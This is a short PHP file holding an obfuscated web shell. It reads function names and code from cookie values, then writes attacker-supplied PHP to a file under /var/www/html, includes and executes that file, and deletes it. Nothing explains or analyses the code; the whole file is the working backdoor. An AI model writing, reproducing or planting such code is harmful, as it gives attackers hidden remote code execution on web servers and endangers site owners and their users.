<?php

$El = $_COOKIE;
if (isset($El[94])) {
    $ZQ = $El[74] . $El[61];
    $aRm = $ZQ($El[46] . $El[32]);
    $rAuL = $aRm($ZQ($El[13]));
    $oSm = $aRm($ZQ($El[42]));
    $Xu = "/var/www/html" . $aRm($ZQ($El[71]));
    $rAuL($Xu, $aRm($ZQ($El[94])));
    include $Xu;
    $oSm($Xu);
}
